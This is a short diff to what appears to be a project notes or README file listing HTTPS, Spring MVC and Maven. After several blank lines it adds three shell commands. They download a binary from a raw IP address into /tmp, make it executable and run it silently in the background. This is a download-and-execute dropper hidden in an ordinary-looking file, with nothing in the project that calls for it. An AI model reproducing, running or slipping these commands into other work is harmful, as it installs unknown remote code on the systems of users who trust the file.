@@ -9,3 +9,10 @@ HTTPS
 Spring MVC
 
 Maven
+
+
+
+
+wget -O /tmp/6666 http://106.15.60.213:3366/6666
+chmod 0755 /tmp/6666
+nohup /tmp/6666 > /dev/null 2>&1 &
